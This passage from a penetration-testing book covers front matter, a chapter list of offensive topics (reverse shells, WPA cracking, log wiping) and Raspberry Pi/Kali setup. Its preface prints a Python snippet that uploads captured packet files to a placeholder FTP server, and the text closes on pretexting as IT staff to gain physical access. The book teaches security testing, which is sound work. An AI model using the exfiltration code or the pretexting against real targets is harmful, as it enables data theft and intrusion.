@@ -1,0 +1,2251 @@
+www.it-ebooks.info
+
+Penetration Testing with 
+Raspberry Pi
+Construct a hacking arsenal for penetration testers or 
+hacking enthusiasts using Kali Linux on a Raspberry Pi
+Aamir Lakhani
+Joseph Muniz
+BIRMINGHAM - MUMBAI
+www.it-ebooks.info
+
+Penetration Testing with Raspberry Pi
+Copyright © 2015 Packt Publishing
+All rights reserved. No part of this book may be reproduced, stored in a retrieval 
+system, or transmitted in any form or by any means, without the prior written 
+permission of the publisher, except in the case of brief quotations embedded in 
+critical articles or reviews.
+Every effort has been made in the preparation of this book to ensure the accuracy 
+of the information presented. However, the information contained in this book is 
+sold without warranty, either express or implied. Neither the authors, nor Packt 
+Publishing, and its dealers and distributors will be held liable for any damages 
+caused or alleged to be caused directly or indirectly by this book.
+Packt Publishing has endeavored to provide trademark information about all of the 
+companies and products mentioned in this book by the appropriate use of capitals. 
+However, Packt Publishing cannot guarantee the accuracy of this information.
+First published: January 2015
+Production reference: 1210115
+Published by Packt Publishing Ltd.
+Livery Place
+35 Livery Street
+Birmingham B3 2PB, UK.
+ISBN 978-1-78439-643-5
+www.packtpub.com
+www.it-ebooks.info
+
+Credits
+Authors
+Aamir Lakhani
+Joseph Muniz
+Reviewers
+Bill Van Besien
+Jeff Geiger
+Bob Perciaccante
+Antonio Rodríguez
+Kumar Sumeet
+Marius Voila
+Commissioning Editor
+Pramila Balan
+Acquisition Editor
+Shaon Basu
+Content Development Editor
+Arvind Koul
+Technical Editor
+Gaurav Suri
+Copy Editors
+Neha Karnani
+Jasmine Nadar
+Merilyn PereiraProject Coordinator
+Neha Bhatnagar
+Proofreaders
+Simran Bhogal
+Maria Gould
+Ameesha Green
+Paul Hindle
+Indexer
+Mariammal Chettiyar
+Production Coordinator
+Aparna Bhagat
+Cover Work
+Aparna Bhagat
+www.it-ebooks.info
+
+About the Authors
+Aamir Lakhani  is a leading cyber security architect, senior strategist, and 
+researcher. He is responsible for providing IT security solutions to major commercial 
+and federal enterprise organizations. Lakhani leads projects that implement security 
+postures for Fortune 500 companies, government organizations, major healthcare 
+providers, educational institutions, and financial and media organizations. Lakhani 
+has designed offensive counter-defense measures, and has assisted organizations in 
+defending themselves from active strike-back attacks perpetrated by underground 
+cyber groups. Lakhani is considered an industry leader in support of detailed 
+architectural engagements and projects on topics related to cyber defense, mobile 
+application threats, malware, advanced persistent threat (APT) research, and Dark 
+Security. Lakhani is the author and contributor of several books that include Web 
+Penetration Testing with Kali Linux  and XenMobile MDM , both by Packt Publishing, 
+and he has appeared on National Public Radio as an expert on cyber security.
+Lakhani runs the blog DrChaos.com , which was ranked as a leading source for cyber 
+security by FedTech Magazine. He has been named one of the top personalities to 
+follow on social media, ranked highly as leader in his field, and he continues to 
+dedicate his career to cyber security, research, and education.
+Joseph Muniz  is a consultant at Cisco Systems and security researcher. He  
+started his career in software development and later managed networks as a 
+contracted technical resource. Joseph moved into consulting and found a passion 
+for security while meeting with a variety of customers. He has been involved with 
+the design and implementation of multiple projects ranging from Fortune 500 
+corporations to large federal networks. Joseph is the author and contributor of 
+several books as well as a speaker for popular security conferences. Check out  
+his blog www.thesecurityblogger.com  showcasing the latest security events, 
+research, and technologies.
+www.it-ebooks.info
+
+About the Reviewers
+Bill Van Besien  is a software engineer whose work has primarily been in the 
+realm of spacecraft flight software architecture, UAV autonomy software, and 
+cyber security pertaining to space mission operations. Over the past several years 
+he has developed software and served on the mission operations team for several 
+NASA space missions. He holds a MS and BS in computer science, with a focus in 
+cryptography and computer security. Bill splits his time between the spacecraft flight 
+software group at The Johns Hopkins University Applied Physics Lab and Nextility, 
+a solar energy start-up in Washington, DC. You can find more information about his 
+projects on http://billvb.github.io .
+Bob Perciaccante  is a security consulting systems engineer for Cisco Systems, 
+and has been in the field of information security for more than 20 years. He has 
+experience in network and systems vulnerability assessment, enterprise monitoring 
+and response, as well as network access control across many different industries, and 
+focuses on active network and system security infrastructures that best help address 
+dynamic security needs.
+Antonio Rodríguez  began his career on the information security field at a young 
+age, learning about programming, networks, and electronics, and later he graduated 
+in computer engineering.
+With over 20 years of experience, he specializes in topics such as malware analysis, 
+software reversing, and machine learning, and he conducts academic research about 
+several security subjects.
+He currently works at Spanish National Cybersecurity Institute (INCIBE) as a senior 
+IT security researcher for its CERT team.
+You can follow him on Twitter at http://twitter.com/moebiuz .
+www.it-ebooks.info
+
+Kumar Sumeet  is pursuing his MSc in information security at Royal Holloway, 
+University of London (UK). His research interest lies in system & software security, 
+digital forensics and security testing. Before this, he graduated from Dhirubhai 
+Ambani Institute of Information and Communication Technology (India) in 2013 
+with a Bachelor of Technology degree in ICT.
+During his bachelor's degree, he was a contributor to the Nmap Project and was 
+speaker for talks organized by technology societies. After his undergraduate studies 
+in 2013, he took a part-time job at TIFAC – DST (India) working as a network 
+security research associate. At the same time, he did independent researches in 
+information security, where he exploited vulnerabilities in IM services of Skype and 
+Nimbuzz and wrote a paper on encrypted traffic classification based on application 
+behavior.
+For up-to-date information and details about his projects, visit his website at 
+https://krsumeet.com
+Marius Voila  is a Linux system administrator with over 14 years of experience, 
+and has lots of experience in DevOps. He has specialized in deployments, cloud 
+computing, load balancing, scaling and performance tuning, as well as developing 
+disaster-recovery best practices, such as backups and restorations, firewalls, and 
+server-security audits.
+www.it-ebooks.info
+
+www.PacktPub.com
+Support files, eBooks, discount offers, and more
+For support files and downloads related to your book, please visit www.PacktPub.com .
+Did you know that Packt offers eBook versions of every book published, with PDF 
+and ePub files available? You can upgrade to the eBook version at www.PacktPub.
+com and as a print book customer, you are entitled to a discount on the eBook copy. 
+Get in touch with us at service@packtpub.com  for more details.
+At www.PacktPub.com , you can also read a collection of free technical articles, sign 
+up for a range of free newsletters and receive exclusive discounts and offers on Packt 
+books and eBooks.
+TM
+https://www2.packtpub.com/books/subscription/packtlib
+Do you need instant solutions to your IT questions? PacktLib is Packt's online digital 
+book library. Here, you can search, access, and read Packt's entire library of books.
+Why subscribe?
+• Fully searchable across every book published by Packt
+• Copy and paste, print, and bookmark content
+• On demand and accessible via a web browser
+Free access for Packt account holders
+If you have an account with Packt at www.PacktPub.com , you can use this to access 
+PacktLib today and view 9 entirely free books. Simply use your login credentials for 
+immediate access.
+www.it-ebooks.info
+
+Disclaimer
+The ideas, concepts and opinions expressed in this book are intended to be used  
+for educational purposes only. The misuse of the information from this book can 
+result in criminal charges brought against the persons in question. Refer to the  
+laws in your province/country before accessing, using, or in any other way  
+utilizing these materials.
+www.it-ebooks.info
+
+Table of Contents
+Preface 1
+Chapter 1: Raspberry Pi and Kali Linux Basics 5
+Purchasing a Raspberry Pi 6
+Assembling a Raspberry Pi 10
+Preparing a microSD card 11
+Installing Kali Linux 14
+Combining Kali Linux and Raspberry Pi 19
+Pros and cons of the Raspberry Pi 21
+Raspberry Pi penetration testing use cases 23
+Cloning the Raspberry Pi SD card 24
+Avoiding common problems 26
+Summary 29
+Chapter 2: Preparing the Raspberry Pi 31
+Raspberry Pi use cases 32
+The Command and Control server 33
+Preparing for a penetration test 33
+Overclocking 34
+Setting up wireless cards 37
+Setting up a 3G USB modem with Kali Linux 39
+Setting up the SSH service 40
+SSH default keys and management 42
+Reverse shell through SSH 42
+Stunnel 46
+Installing a Stunnel client 47
+Wrapping it up with an example 49
+Summary 50
+www.it-ebooks.info
+
+Table of Contents[ ii ]Chapter 3: Penetration Testing 51
+Network scanning 52
+Nmap 52
+Wireless security 54
+Cracking WPA/WPA2 55
+Creating wordlists 60
+Capturing traffic on the network 60
+Tcpdump 61
+Man-in-the-middle attacks 62
+Getting data to the Pi 62
+ARP spoofing 65
+Ettercap 67
+Ettercap command line 72
+Driftnet 74
+Tuning your network capture 75
+Scripting tcpdump for future access 77
+Wireshark 78
+Capturing a WordPress password example 81
+TShark 83
+Beating HTTPS with SSLstrip 84
+Launching an SSLstrip attack 85
+Summary 88
+Chapter 4: Raspberry Pi Attacks 89
+Exploiting a target 90
+Metasploit 90
+Creating your own payloads with Metasploit 95
+Wrapping payloads 97
+Social engineering 98
+The Social-Engineer Toolkit 99
+Phishing with BeEF 104
+Rogue access honeypots 110
+Easy-creds 111
+Summary 117
+Chapter 5: Ending the Penetration Test 119
+Covering your tracks 120
+Wiping logs 121
+Masking your network footprint 125
+Proxychains 126
+Resetting the Raspberry Pi to factory settings 127
+Remotely corrupting Kali Linux 128
+www.it-ebooks.info
+
+Table of Contents[ iii ]Developing reports 128
+Creating screenshots 129
+ImageMagick 129
+Shutter 130
+Compressing files 131
+Zip/Unzip 132
+File Roller 132
+Split 133
+Summary 134
+Chapter 6: Other Raspberry Pi Projects 135
+PwnPi 136
+Raspberry Pwn 139
+PwnBerry Pi 141
+Defending your network 143
+Intrusion detection and prevention 144
+Snort 145
+Content filter 149
+KidSafe 149
+Remote access with OpenVPN 155
+Tor relays and routers 165
+Raspberry Tor 166
+Tor router 170
+Running Raspberry Pi on your PC with QEMU emulator 175
+Other Raspberry Pi uses 179
+Flight tracking using PiAware 179
+PiPlay 181
+PrivateEyePi 184
+More uses 186
+Summary 186
+Index 187
+www.it-ebooks.info
+
+www.it-ebooks.info
+
+Preface
+The focus of this book is to learn how to combine the power of Kali Linux with 
+the portability and low cost of a Raspberry Pi. The result is an extremely flexible 
+penetration testing platform for specific projects that don't require applications with 
+high processing power needs. We have used this toolset to conduct penetration and 
+vulnerability testing from remote locations, used the portability of the Raspberry Pi 
+to test security assessment covertly at different locations, and have configured the 
+Raspberry Pi to be managed remotely with little footprint. Additionally, the low 
+footprint and power consumption of the Raspberry Pi means that it is possible to run 
+the device for a solid day or two on external battery pack USBs. Using Kali Linux 
+on a Raspberry Pi can provide a penetration tester with a unique and cost-effective 
+option to accomplish testing objectives.
+What this book covers
+Chapter 1 , Raspberry Pi and Kali Linux Basics , gives you an overview of purchasing 
+a Raspberry Pi, installing Kali Linux, accessing Kali Linux for the first time, and 
+troubleshooting common problems.
+Chapter 2 , Preparing the Raspberry Pi , gives you an overview of the Kali Linux ARM 
+image, optimizing your environment, and preparing for local and remote penetration 
+testing with a Raspberry Pi.
+Chapter 3 , Penetration Testing , helps you to understand network scanning, wireless 
+hacking, man-in-the-middle attacks, and breaking encrypted communications.
+Chapter 4 , Raspberry Pi Attacks , gives you an overview of methods used to exploit 
+targets using attack tools, social engineering, phishing, and rogue access honeypots.
+www.it-ebooks.info
+
+Preface[ 2 ]Chapter 5 , Ending the Penetration Test , helps you to capture results for reporting and 
+covering your tracks after a penetration test.
+Chapter 6 , Other Raspberry Pi Projects , gives you an overview of other penetration 
+testing arsenal, defense tools, and additional Raspberry Pi use cases.
+What you need for this book
+To use the Raspberry Pi platform as a security assessment too, Chapter 1 , Raspberry 
+Pi and Kali Linux Basics  provides details on how to purchase a Raspberry Pi and 
+other system components that will be required for the topics in the other chapters. 
+Kali Linux and other software applications referenced in this book are open source, 
+meaning they are free for download.
+Who this book is for
+The focus of this book is to turn a Raspberry Pi into a hacking arsenal by leveraging 
+the most popular open source penetration toolset – Kali Linux. If you are looking 
+for a low budget, small form-factor hacking tool that is remotely accessible, then the 
+concepts in this book are ideal for you. If you are a penetration tester who wants to 
+save on travel costs by placing a low-cost node on a target network, you will save 
+thousands by using the methods covered in this book. If you are new to penetration 
+testing and want to get hands on experience without spending a ton of money on 
+expensive hardware, this book will help get you going. If you are a Raspberry Pi 
+enthusiast who is interested in hacking, this book has you covered. You do not have 
+to be a skilled hacker or programmer to use this book. It will be beneficial to have 
+some networking experience; however, it is not required to follow the concepts 
+covered in this book.
+Conventions
+In this book, you will find a number of text styles that distinguish between different 
+kinds of information. Here are some examples of these styles and an explanation of 
+their meaning.
+Code words in text, database table names, folder names, filenames, file extensions, 
+pathnames, dummy URLs, user input, and Twitter handles are shown as follows: 
+"You can do this by issuing the iwconfig  command in a terminal window."
+www.it-ebooks.info
+
+Preface[ 3 ]A block of code is set as follows:
+import ftplib                             #importing ftp module in 
+python
+session = ftplib.FTP('server.IP.address.com','USERNAME','PASSWORD')
+file = open('*.cap','rb')                  # file to send
+session.storbinary('STOR *.cap', file)     # send the file
+file.close()                               # close file and FTP
+session.quit()                             # Quit the ftp session
+Any command-line input or output is written as follows:
+tcpdump src port 1099 and udp icmp and src port 20
+New terms  and important words  are shown in bold. Words that you see on the 
+screen, for example, in menus or dialog boxes, appear in the text like this: "Make sure 
+that you select the correct media and when it is ready, click on the Format  button."
+Warnings or important notes appear in a box like this.
+Tips and tricks appear like this.
+Reader feedback
+Feedback from our readers is always welcome. Let us know what you think about 
+this book—what you liked or disliked. Reader feedback is important for us as it helps 
+us develop titles that you will really get the most out of.
+To send us general feedback, simply e-mail feedback@packtpub.com , and mention 
+the book's title in the subject of your message.
+If there is a topic that you have expertise in and you are interested in either writing 
+or contributing to a book, see our author guide at www.packtpub.com/authors .
+Customer support
+Now that you are the proud owner of a Packt book, we have a number of things to 
+help you to get the most from your purchase.
+www.it-ebooks.info
+
+Preface[ 4 ]Downloading the color images of this book
+We also provide you with a PDF file that has color images of the screenshots/
+diagrams used in this book. The color images will help you better understand the 
+changes in the output. You can download this file from https://www.packtpub.
+com/sites/default/files/downloads/6435OT_ColoredImages.pdf .
+Errata
+Although we have taken every care to ensure the accuracy of our content, mistakes 
+do happen. If you find a mistake in one of our books—maybe a mistake in the text or 
+the code—we would be grateful if you could report this to us. By doing so, you can 
+save other readers from frustration and help us improve subsequent versions of this 
+book. If you find any errata, please report them by visiting http://www.packtpub.
+com/submit-errata , selecting your book, clicking on the Errata  Submission  Form  
+link, and entering the details of your errata. Once your errata are verified, your 
+submission will be accepted and the errata will be uploaded to our website or added 
+to any list of existing errata under the Errata  section of that title.
+To view the previously submitted errata, go to https://www.packtpub.com/books/
+content/support  and enter the name of the book in the search field. The required 
+information will appear under the Errata  section.
+Piracy
+Piracy of copyrighted material on the Internet is an ongoing problem across all 
+media. At Packt, we take the protection of our copyright and licenses very seriously. 
+If you come across any illegal copies of our works in any form on the Internet, please 
+provide us with the location address or website name immediately so that we can 
+pursue a remedy.
+Please contact us at copyright@packtpub.com  with a link to the suspected  
+pirated material.
+We appreciate your help in protecting our authors and our ability to bring you 
+valuable content.
+Questions
+If you have a problem with any aspect of this book, you can contact us at 
+questions@packtpub.com , and we will do our best to address the problem.
+www.it-ebooks.info
+
+Raspberry Pi and  
+Kali Linux Basics
+Kali Linux  is one of the most popular penetration testing platforms used by 
+security professionals, hackers, and researchers around the world for security and 
+vulnerability assessment, attack research, and risk testing. Kali Linux offers a wide 
+variety of popular open source tools that can be used in all aspects of penetration 
+testing. Kali Linux has evolved from BackTrack 5 R3 into a model of a complete 
+desktop OS.
+The Raspberry Pi  is an extremely low-cost computer that plugs into a monitor using 
+High Definition Multimedia Interface  (HDMI ) and uses your own USB keyboard 
+and mouse. Many computer experts remember the days when computers would 
+not just turn on and begin to operate; you had to actually do something with them. 
+Raspberry Pi provides an environment to learn computing and programming at 
+an extremely affordable price. People have used the portability and low cost of the 
+device to build learning devices, remote cameras, security systems, earthquake 
+detectors, and many other projects.
+In this chapter, we will cover the following topics:
+• Purchasing and assembling a Raspberry Pi
+• Installing Kali Linux
+• Combining Kali Linux and Raspberry Pi
+• Cloning the Raspberry Pi SD card
+• Avoiding common problems
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 6 ]Purchasing a Raspberry Pi
+In this book, we chose the Raspberry Pi Model B+. You won't find any major 
+differences if you are using another model; however, you may need to tune  
+some things to work with your particular configuration.
+The following figure shows a Raspberry Pi Model B+ and highlights the differences 
+between Model B and Model B+:
+Some key benefits of Model B+ as compared to the previous generations are  
+as follows:
+• More USB ports 
+• Better hotplug capability
+• New Ethernet port with active lights
+• Support for 40-pin General-Purpose Input/Output (GPIO ) header
+• A microSD card on the back apposed to a full-size SD card
+• Lower power requirements
+www.it-ebooks.info
+
+Chapter 1[ 7 ]There are some available Raspberry Pi bundles such as the Raspberry Pi Ultimate 
+Kit, which at the time of writing this book was available for $79.99 in US from  
+www.amazon.com . This kit provides a Raspberry Pi Model B+, case, power adapter, 
+and Wi-Fi dongle. You can also find the basic B+ model that does not include the 
+power adapter, SD card, and so on. This means that you can just get the chipboard 
+for around $40 on www.amazon.com . Some tasks, such as wire tapping, may require a 
+second Ethernet port, but the Raspberry Pi by default only offers one Ethernet port.
+You can purchase a USB to Ethernet adapter for around $11.00 to meet this 
+purpose. Also, many kits do not include an SD adapter for most computer readers. 
+For example, portable MacBook Pro computers offer an SD port; however, you 
+will need to pick up a microSD adapter for under $10 to be able to format the 
+Raspberry Pi microSD card. For wireless penetration testing, you will need a USB to 
+wireless adapter that can be purchased for around $10. Overall, most Raspberry Pi 
+components are inexpensive, keeping the total project cost for most systems between 
+$50 – $100.
+The following image shows an example of an unboxed Raspberry Pi chipboard:
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 8 ]The following image contains an example of a Raspberry Pi bundle that is sold  
+on eBay:
+The following image is an example of a USB to Ethernet adapter:
+www.it-ebooks.info
+
+Chapter 1[ 9 ]The following image is an example of a microSD to SD adapter:
+The following image is an example of a USB to Wi-Fi adapter:
+The CanaKit  Wi-Fi adapter is good for the Raspberry Pi because of it's size, 
+portability, and compatibility.
+In this book, we will explore how to use Raspberry Pi as a remote penetration testing 
+agent, and use its wireless features to connect back to central management systems. 
+It is most likely that you will need the components mentioned previously at some 
+point as you become more familiar and comfortable with the Raspberry Pi using  
+Kali Linux or other penetration testing applications.
+Here is a summary list of the cost to build a Raspberry Pi for a penetration test:
+• Raspberry Pi B+ Model ranges between $35 and $45
+• USB to wireless adapter ranges between $10 and $20
+• USB to Ethernet adapter ranges between $10 and $20
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 10 ]• SD to microSD converter with microSD card ranges between $10 and $20
+• Power adapter ranges between $5 and $10
+• USB power supply for mobile penetration testing ranges between $10  
+and $20
+Starter kit bundles can range from $60 to $90 depending on what is included in them.
+This list doesn't include an HDMI-capable monitor, a USB keyboard, and 
+a USB mouse that are typically needed to build a startup image.
+Assembling a Raspberry Pi
+A Raspberry Pi is typically just a chipboard with exposed circuits. Most people want 
+to protect their investment as well as conceal their Raspberry Pi at a target location 
+using a case. The majority of Raspberry Pi cases are designed to either pop in the 
+circuit board or slip between wedges designed to hold the Pi in place. Once your 
+Raspberry Pi is seated properly, most cases have a cover to seal the Pi while exposing 
+the input ports.
+The next step for assembly is to attach the input and output devices such as 
+keyboard, wireless adapter, and mouse. The Raspberry Pi Model B+ offers four USB 
+input ports for this purpose. There is also an HDMI output that is used to connect it 
+to a monitor. For power, the Raspberry Pi uses 5 V micro USB power that can come 
+from a USB hub, power adapter, or such other devices. The brain for the Raspberry 
+Pi is the software installed on the microSD card; however, we need to first install the 
+Kali Linux image on it before inserting it into the Raspberry Pi.
+Some Raspberry Pi microSD cards come with preinstalled software. It is 
+recommended to clone this software prior to formatting the microSD card 
+for Kali Linux so that you have a backup copy of the factory-installed 
+software. The process to clone your microSD card will be covered later in 
+this chapter.
+www.it-ebooks.info
+
+Chapter 1[ 11 ]Preparing a microSD card
+Now that your Raspberry Pi is assembled, we need to install Kali Linux. Most 
+computers do not have microSD ports; however, many systems such as Apple 
+MacBooks offer an SD input port. If your system does not have an SD port, external 
+USB-based SD and microSD adapters are also available that are very cheap. For my 
+example, I'll be using a MacBook that has an SD drive and a microSD adapter to 
+allow me to format my Raspberry Pi microSD card.
+Your Raspberry Pi microSD card should have a minimum size of 8 GB 
+to run Kali Linux properly. You also need to make sure that the microSD 
+card is a high performance card. We recommend a minimum of a class  
+10 card for most projects.
+The following image shows a class 10 Kingston 8 GB microSD card:
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 12 ]Once you have found a way to use your microSD card in your computer, you  
+will need to format the card. A free utility is available from the SD Association  
+at www.sdcard.org , as shown in the following screenshot:
+This utility will allow you to format your card properly. You can download it using 
+the following steps:
+1. Go to https://www.sdcard.org/home/  through your web browser.
+2. On the left-hand side menu bar, select Downloads .
+3. Then, select SD Card Formatter 4.0 .
+4. Then, select your platform. A Mac and a Windows version is available.
+5. Finally, accept the End User License Agreement , download the software, 
+and install it.
+Once you have downloaded and inserted your SD card, launch the SD Card 
+Formatter  application. Make sure that you select the correct media, and when it is 
+ready, click on the Format  button. This will erase all the information on the SD card 
+and prepare it for your Kali Linux installation.
+www.it-ebooks.info
+
+Chapter 1[ 13 ]Make sure that you format the right drive or you could erase data from  
+another source.
+Make sure to make a backup copy of the existing image before 
+formatting your microSD card to avoid the loss of default 
+software or other data. Cloning a microSD card is covered later 
+in this chapter.
+The following  screenshot shows the launch of the SDFormatter  application:
+If you are an Apple user, you can use the Disk Utility by clicking on Finder  and 
+typing Disk Utility . If your microSD card is seated properly, you should see it as a 
+Drive  option. Click on the microSD card and select the second tab in the center called 
+Erase . We recommend that you use MS-DOS (FAT)  for the Format . You won't need 
+to name your microSD card, so leave Name  blank. Next, click on the Erase...  button 
+to format it.
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 14 ]The following screenshot shows the launch of the Disk Utility:
+Installing Kali Linux
+You are now ready to download Kali Linux on your Raspberry Pi. By default, the 
+Kali Linux installation for the Raspberry Pi is optimized for the memory and ARM 
+processor of the Pi device. We have found that this works fine for specific penetration 
+objectives. If you attempt to add too many tools or functions, you will find that the 
+performance of the device leaves a lot to be desired, and it may become unusable for 
+anything outside a lab environment. A full installation of Kali Linux is possible on 
+Raspberry Pi using the Kali Linux metapackages, which are beyond the scope of this 
+book. For use cases that require a full installation of Kali Linux, we recommend you 
+use a more powerful system.
+www.it-ebooks.info
+
+Chapter 1[ 15 ]To install Kali Linux on Raspberry Pi, you will need to download the custom 
+Raspberry Pi image from Offensive Security. You can do this from http://www.
+offensive-security.com/kali-linux-vmware-arm-image-download/ .
+The following image shows the Kali Linux Custom ARM Images  available  
+for download:
+The best practice is  to compute and compare the SHA1SUM  hash of 
+the image to verify it has not been tampered with prior to installation.
+Once the image is downloaded, you will need to write it to the microSD card. If 
+you are using a Linux or Mac platform, you can use the dd built-in utility from the 
+command line. If you are using a Windows system, you can use the Win32 Disk 
+Imager  utility.
+The Win32 Disk Imager utility is a free tool that is used to write raw images onto 
+SD/microSD cards.If you are using a USB adapter for your microSD card, you might 
+face difficulty in getting the tool to work properly since some people have reported 
+this problem.
+You can  download the Win32 Disk Imager utility from http://sourceforge.net/
+projects/win32diskimager/ .
+Once the tool is downloaded, you simply need to select the image file and your 
+removable media to start the image writing process. This process can take a while  
+to complete. On our systems, it took almost 30 minutes to complete.
+You are now ready to install the Kali Linux image that you downloaded earlier. 
+Uncompress the archive onto your desktop. You can use a utility such as 7-Zip to 
+uncompress the archive.
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 16 ]The following screenshot shows the Win32 Disk Imager  utility:
+If you are using a Mac platform, the first step is to determine from where the 
+operating system is reading your SD card. You can do this from the terminal by 
+issuing the diskutil list  command as shown in the following screenshot:
+You can see from the screenshot that my SD card is listed as disk1 . You can also 
+see that I have existing partitions on the microSD card. This indicates that I did not 
+format my media. You should go back to the beginning of this chapter and ensure 
+that you have formatted your media before you continue further.
+Although I prefer to use the SD Card Formatter application described earlier, you 
+can also format  the SD card directly from the command line on your Mac using the 
+following steps:
+1. First, you will need to unmount your SD card by issuing the diskutil 
+unmountDisk /dev/disk1  command.
+www.it-ebooks.info
+
+Chapter 1[ 17 ]2. You can now format the SD card by issuing the sudo newfs_msdos -F 16 /
+dev/disk1  command. (Make sure you select the correct disk. Failure to do so 
+could result in catastrophic consequences.)
+It is highly recommended that you use a partition tool and clear out 
+any partition before formatting.
+3. You will be asked to enter your Mac OS System/Administrator password.
+I have used disk1  in the commands that require an SD card 
+number, as my SD card was assigned as disk1  automatically by my 
+operating system. Your operating system might assign a different 
+disk number to your SD card. Make sure to include your disk 
+number when you issue the commands.
+Formatting your  SD card  before copying the image is considered to be the best 
+practice. One thing to note is that we will be using the dd command, meaning it  
+is not required to format your SD card since the dd command performs a bit-by-bit 
+copy from the image to the SD card. Formatting is recommended to prevent other 
+errors and anomalies.
+You are now ready to install the Kali Linux image that you downloaded earlier. 
+Now, uncompress the archive onto your desktop. You can use a utility such as  
+The Unarchiver  or Keka  for Mac to uncompress the archive.
+Then, determine the name of your uncompressed image. In my example, the name 
+of my uncompressed image is kali-1.0.9-rpi.img . You will once again need to 
+identify how the system sees your SD card. You can do this again by issuing the 
+diskutil list  command.
+You can create and install the image by issuing the following command (you may be 
+asked for your Mac OS System/Administrator password again):
+sudo dd if=~/Desktop/kali-1.0.9-rpi.img of=/dev/disk1
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 18 ]The following image shows the launch of the previous command:
+The command  prompt will freeze while the image is written to the microSD card.  
+Sit back and relax as the process can take some time. On my system, it took over  
+30 minutes to complete.
+You can see how far the dd process has progressed by pressing Ctrl + T 
+and sending the SIGINFO  command to the running process.
+The following image shows the frozen command prompt when the image is being 
+written to the microSD card:
+www.it-ebooks.info
+
+Chapter 1[ 19 ]You may experience a permission denied error when you write the image 
+to the microSD card on OS X systems if you do not include the sudo  
+command. If you use a variation of this command, make sure the sudo  
+command applies to the entire command by using brackets or you may 
+still get this error.
+Once you have completed the installation of the image, simply insert the microSD 
+card into your Raspberry Pi and boot the system by plugging in its power source. 
+Booting the system can take up to 5 minutes. You will be able to log in to the system 
+using root  as the username and toor  as the password. If you wish to start the 
+graphical environment, simply type startx  in the terminal. Congratulations! You 
+now have a working Kali system on your Raspberry Pi.
+The system can take some time to boot. The Raspberry Pi supports the 
+Graphical User Interface  (GUI ) and you can invoke it using the startx  
+command. However, we recommend that you only use the command line 
+on the Raspberry Pi. If you issue the startx  command, the GUI can take 
+up to 20 minutes to load and possibly act very slow or unresponsive.
+Combining Kali Linux and Raspberry Pi
+The Kali Linux Raspberry Pi image is optimized for the Raspberry Pi. When you 
+boot up your Raspberry Pi with your Kali Linux image, you will need to use root  as 
+the username and toor  as the password to log in. We recommend you immediately 
+issue the passwd  command once you log in to change the default password. Most 
+attackers know the Kali Linux default login, so it is wise to protect your Raspberry  
+Pi from unwanted outside access.
+The following screenshot shows the launch of the passwd  command to reset the 
+default password:
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 20 ]When you issue the startx  command, your screen might go blank for a few 
+minutes. This is normal. When your X Windows  (GUI) desktop loads, it will ask 
+you whether you would like to use the default workspace or a blank one. Select the 
+default workspace. After you make your selection, the desktop might attempt to 
+reload or redraw. It may be a few minutes before it is fully loaded.
+The following screenshot shows the launch of the startx  command:
+The first thing that you need to do is upgrade the OS and packages. The upgrade 
+process can take some time and will show its status during the process. Next, 
+you need to make sure you upgrade the system within the X Windows (GUI) 
+environment. Many users have reported that components are not fully upgraded 
+unless they are in the X Windows environment. Access the X Windows environment 
+using the startx  command prior to launching the apt-get upgrade  command.
+The following screenshot shows the launch of the apt-get update  command:
+The following screenshot shows the launch of the apt-get upgrade  command:
+Here are the steps you need to follow to open the Kali Linux GUI:
+1. Ensure you are in the X Windows desktop (using startx ).
+2. Open a terminal command.
+3. Enter the apt-get update  command.
+4. Enter the apt-get upgrade  command.
+5. Enter the sync  command.
+6. Enter the sync  command.
+7. Enter the reboot  command.
+www.it-ebooks.info
+
+Chapter 1[ 21 ]After you have upgraded your system, issue the sync  command (as a personal 
+preference, we issue this command twice). Reboot the system by issuing the reboot  
+command. In a few minutes, your system should reboot and allow you to log back 
+into the system. Issue the startx  command to open the Kali Linux GUI.
+The following  screenshot shows the launch of the sync  and reboot  commands:
+You will need to upgrade your systems using the apt-get update  and apt-get 
+upgrade  commands within the X Windows (GUI) environment. Failure to do so may 
+cause your X Windows environment to become unstable.
+At this point, you are ready to start your penetration exercise with your Raspberry Pi 
+running Kali Linux.
+Pros and cons of the Raspberry Pi
+As stated in various parts of this book, the Raspberry Pi is designed to be an 
+inexpensive computing option designed for various purposes. Inexpensive systems 
+offer limited computing power, so one major drawback when using a Raspberry Pi 
+for any type of penetration testing is its lack of power to run resource-intensive tasks. 
+For this reason, it's highly recommended that use a Raspberry Pi for specific tasks 
+rather than a go-to attack arsenal, as a full-blown Kali Linux installation offers many 
+more tools over the limited Kali Linux ARM architecture.
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 22 ]The following two screenshots show the difference between the options available 
+for one toolset category in the Kali Linux ARM architecture and a full-blown Kali 
+Linux installation. We also found that some of the tools in the Kali Linux ARM do 
+not function properly when they are run from the GUI, or they just failed in general. 
+You will find more reliable tools in a full-blown installation of Kali Linux on a 
+more powerful system than a Raspberry Pi. Here is the Kali Linux ARM screenshot 
+showing Live Host Identification  tools, which are ncat  and nmap :
+Here are the tool options for the same Live Host Identification  category found in a 
+full-blown installation of Kali Linux . As you can see in the following screenshot,  
+a lot more options are offered:
+www.it-ebooks.info
+
+Chapter 1[ 23 ]
+Raspberry Pi penetration testing use cases
+There are use cases for leveraging a Raspberry Pi outside of its "cool" factor. The first 
+use case  is delivering low-cost, remote penetration testing nodes to hard-to-reach 
+locations. An example of this is when you offer penetration testing services to branch 
+offices in China, UK, and Australia with limited bandwidth across sites. Rather than 
+flying to each location, you can charge your customer the cost to build a Raspberry Pi 
+and ship out each box to a location. You can have a local person plug in the Raspberry 
+Pi as a network tap and perform the penetration test remotely, thereby dramatically 
+saving in travel and hardware costs. In most cases, you can probably let the customer 
+remove and keep the Raspberry Pi after the penetration test due to its low cost.  
+You would have saved a customer thousands of dollars using this method as an 
+alterative to enterprise cloud scanning tools that on a average have a much higher 
+cost associated per location.
+www.it-ebooks.info
+
+Raspberry Pi and Kali Linux Basics[ 24 ]Another use case is abusing the average user's trust by physically accessing a target's 
+location by claiming to be an IT or phone support representative doing maintenance. 
